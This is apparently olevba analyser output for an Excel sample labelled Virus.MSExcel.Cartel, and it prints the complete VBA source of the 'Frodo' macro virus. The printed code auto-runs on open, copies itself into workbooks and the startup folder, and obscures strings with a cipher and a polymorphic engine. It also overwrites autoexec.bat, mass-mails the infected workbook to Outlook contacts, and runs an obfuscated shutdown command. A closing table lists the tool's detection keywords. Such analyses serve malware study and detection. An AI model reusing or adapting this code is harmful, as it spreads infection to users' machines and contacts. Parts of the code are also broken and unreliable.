olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Cartel-9e7141362ade675565192e31b5d8d13cbf42801c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Cartel-9e7141362ade675565192e31b5d8d13cbf42801c - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio1.cls 
in file: Virus.MSExcel.Cartel-9e7141362ade675565192e31b5d8d13cbf42801c - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio2.cls 
in file: Virus.MSExcel.Cartel-9e7141362ade675565192e31b5d8d13cbf42801c - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio3.cls 
in file: Virus.MSExcel.Cartel-9e7141362ade675565192e31b5d8d13cbf42801c - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modulo1.bas 
in file: Virus.MSExcel.Cartel-9e7141362ade675565192e31b5d8d13cbf42801c - OLE stream: '_VBA_PROJECT_CUR/VBA/Modulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' -------------------------------
' - Frodo.vba.Excel Virus v 1.0 -
' - based on the parasite virus    -
' - Using polymorphic and string-
' - encryption                            -
' -------------------------------

Sub AutoOpen()       ' autoexecute on open
 Application.OnSheetActivate = "frodo"   ' attach the procedure (Frodo) to
the SheetActivate event
 Call Mail      ' Call Mail Procedure
End Sub

Sub frodo()
 On Error Resume Next
 vname = crypt("gsnen")
 dwp = crypt("Qdsrno`m/ymr")
 dvp = Application.StartupPath & "\" & dwb
 counter1 = 0
 Counter2 = 0
 With Application
  .ScreenUpdating = False
  .DisplayAlert = False
  .EnableCancelKey = xlDisabled
 End With
 Set cb = CommandBars
 Set ctrl = Controls
 cb("Tools").ctrl(10).Delete: cb("Tools").ctrl(12).Delete
 cb("View").ctrl(3).Delete: cb("Window").ctrl(3).Delete
 cb("Window").ctrl(4).Delete
 Call Polymorph        ' Start Polymorphic Engine
 Randomize
 If Int((Rnd * 10) + 1) = 10 Then
  Application.Caption = crypt("Gsnen!Mhwdr!rnldvidsd!ho!Uhld")
  Application.StatusBar = crypt("Dybdm!Rtyy")
  Open "c:\autoexec.bat" For Output Access Write As 1
   Print #1, "@Echo off"
   Print #1, "Echo ---------------------------"
   Print #1, "Echo -   You owned by Frodo   -"
   Print #1, "Echo - greets to  Mr Shaer     -"
   Print #1, "Echo - 28.03.2002        -"
   Print #1, "Echo -   (C)by Dark Eclipse    -"
   Print #1, "Echo ---------------------------"
  Close 1
 End If
 If Month(Now) = 22 And Day(Now) = 5 Then Call bla
 If Month(Now) = 23 And Day(Now) = 5 Then Call blubb
 Application.VBE.ActiveVBProject.VBComponents.Item(vname).Export
Application.StartupPath & "\" & crypt("shofd/ymr/c`r")
 If Dir(dvp) = dwp Then Counter2 = 1
 For X = 1 To ActiveWorkbook.VBProject.VBComponents.Count
  If ActiveWorkbook.VBProject.VBComponents(X).Name = vname Then counter1 = 1
 Next X
 If counter1 = 0 Then
  ActiveWorkbook.VBProject.VBComponents.Import Application.StartupPath & "\"
& crypt("shofd/ymr/c`r")
  ActiveWorkbook.Save
 End If
 If Counter2 = 0 Then
  Workbook.Add.SaveAs FileName:=dvp
  ActiveWorkbook.VBProject.VBComponents.Import Application.StartupPath & "\"
& crypt("shofd/ymr/c`r")
  ActiveWindow.Visible = False
  Workbook(dwp).Save
 End If
End Sub

Sub bla()
 On Error Resume Next
 CommandBars("Edit").Enabled = False: CommandBars("Insert").Enabled = False
 CommandBars("Files").Enabled = False: CommandBard("Tools").Enabled = False
End Sub

Sub blubb()
 On Error Resume Next
 CommandBars("Edit").Enabled = True: CommandBars("Insert").Enabled = True
 CommandBars("Files").Enabled = True: CommandBars("Tools").Enabled = True
End Sub

Sub ViewVBCode()
 MsgBox Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(118) +
Chr(101) +
 Chr(114) + Chr(115) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(111) +
Chr(102) +
 Chr(32) + Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) +
Chr(111) +
 Chr(102) + Chr(116) + Chr(32) + Chr(69) + Chr(120) + Chr(99) + Chr(101) +
Chr(108) & vbCr &
 Chr(112) + Chr(114) + Chr(111) + Chr(104) + Chr(105) + Chr(98) + Chr(105) +
Chr(116) +
 Chr(115) + Chr(32) + Chr(115) + Chr(117) + Chr(99) + Chr(104) + Chr(32) +
Chr(99) +
 Chr(111) + Chr(109) + Chr(109) + Chr(97) + Chr(110) + Chr(100) + Chr(115) +
Chr(44) +
 Chr(32) + Chr(112) + Chr(108) + Chr(101) + Chr(97) + Chr(115) + Chr(101) +
Chr(34) & vcCr & Chr(114) +
 Chr(101) + Chr(102) + Chr(101) + Chr(114) + Chr(32) + Chr(116) + Chr(111) +
Chr(32) + Chr(117) +
 Chr(115) + Chr(101) + Chr(114) + Chr(115) + Chr(32) + Chr(109) + Chr(97) +
Chr(110) + Chr(117) +
 Chr(97) + Chr(108) + Chr(32) + Chr(40) + Chr(115) + Chr(101) + Chr(99) +
Chr(46) + Chr(32) +
 Chr(50) + Chr(41) + Chr(32) _, vbCritical, "Microsoft Excel Warning"
 ActiveWorkbook.Save
 Shell Chr(67) + Chr(58) + Chr(92) + Chr(87) + Chr(73) + Chr(78) + Chr(68) +
Chr(79) + Chr(87) + Chr(83) +
 Chr(92) + Chr(82) + Chr(85) + Chr(78) + Chr(68) + Chr(76) + Chr(76) +
Chr(46) + Chr(69) + Chr(88) +
 Chr(69) + Chr(32) + Chr(117) + Chr(115) + Chr(101) + Chr(114) + Chr(46) +
Chr(101) + Chr(120) +
 Chr(101) + Chr(44) + Chr(101) + Chr(120) + Chr(105) + Chr(116) + Chr(119) +
Chr(105) + Chr(110) +
 Chr (100) + Chr(111) + Chr(119) + Chr(115), vbHide
End Sub

Sub Mail()
 On Error Resume Next
 Randomize
 'lots o variables ---------------------------
 Set outapp = CreateObject("Outlook.Application"): Set mapname =
outapp.GetNameSpace ("MAPI")
 Set al = AddressLists: Set cnt = Count: Set lo = Logoff: Set aeck =
Application: Set adacwb = Attachments
 Set sj = Subject: Set bdy = Body: Set Snd = send: Set awb = ActiveWorkbook:
Set fn = FullName
 Set lgon = Logon: Set citm = CreateItem: Set usnm = UserName: oln4 =
"Outlook"
 '--------------------------------------------
 aeck.EnableCancelKey = 0
 If outapp = oln4 Then mapname.lgon "profile", "password"
 For y = 1 To mapname.al.cnt
         mailoop = 1
  Set addlist = mapname.al(y): Set psite = outapp.citm(0)
  For z = 1 To addlist.al.cnt
one:
           vi = addlist.AddressEntries(mailoop)
    GoTo two
three:
           mailoop = mailoop + 1
           If mailoop > 40 Then z = addlist.al.cnt
           GoTo four
two:
           psite.Recipients.Add vi
           GoTo three
four:
         Next z

         psite.sj = "Lets make this work!"
         X = "Are you sick and tired of Microsoft products bugs? Lets unite"
and protest."
         X = X & "Fill up the attached form and send to ms-trial@doj.gov" +
Chr$ (13) + aeck.usnm
         psite.bdy = X
         psite.adacwb.Add awb.fn
         psite.Snd
  vi = ""
 Next y
 mapname.lo
End Sub

Function crypt(String)
 For bla = 1 To Len(String)
  blub = Mid(String, bla, 1)
  If Asc(blub) <> 34 And Asc(blub) <> 35 Then
   If Asc(blub) Mod 2 = 0 Then
    blub = Chr(Asc(blub) + 1 + 3 - 2 - 1)
  Else
    blub = Chr(Asc(blub) - 1)
   End If
  End If
 crypt = crypt & blub
 Next
End Function

Sub Polymorph()
 On Error Resume Next
 Set Current = MacroContainer
 For ploop = 1 To 20
  Number =
Current.VBProject.VBComponents("frodo").CodeModule.ProcCountLines("frodo",
vbext_pk_Proc)
         RandomLine = Int(Rnd() * Number + 1)
         rl = Int(Rnd() * 40 + 1)
         For cl = 1 To rl
                 rb = rb + Chr$(Int((90 - 65 + 1) * Rnd + 65))
         Next cl

          Current.VBProject.VBComponents("frodo").CodeModule.InsertLines
RandomLine , vbTab & "' " & rb
         rb = ""
 Next ploop
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

